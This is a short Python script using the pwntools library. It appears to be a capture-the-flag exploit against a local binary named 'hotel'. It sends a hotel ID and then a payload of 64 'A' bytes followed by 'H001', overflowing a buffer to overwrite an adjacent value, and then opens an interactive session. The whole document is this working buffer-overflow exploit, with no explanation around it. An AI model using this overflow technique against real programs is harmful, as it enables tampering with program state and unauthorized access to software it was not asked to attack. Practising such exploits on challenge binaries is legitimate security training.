from pwn import *
io = process("./hotel")
hotel_id = b"H100"
payload = b"A"*64 + b"H001"
io.sendline(hotel_id)
io.sendline(payload)
io.interactive()